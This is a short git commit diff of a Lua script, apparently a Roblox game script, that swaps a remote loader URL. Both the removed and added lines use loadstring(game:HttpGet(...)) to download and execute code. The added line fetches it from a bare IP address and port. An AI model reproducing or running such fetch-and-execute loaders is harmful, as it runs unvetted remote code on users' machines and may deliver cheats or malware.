dffbe7972c341997fe4a898a4c1915403e7be9e9
scripts <nielanthonyr@gmail.com>
2025-08-24 07:52:23 +0800

    script.lua

--- script.lua
+++ script.lua
@@ -1,5 +1,5 @@
 ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
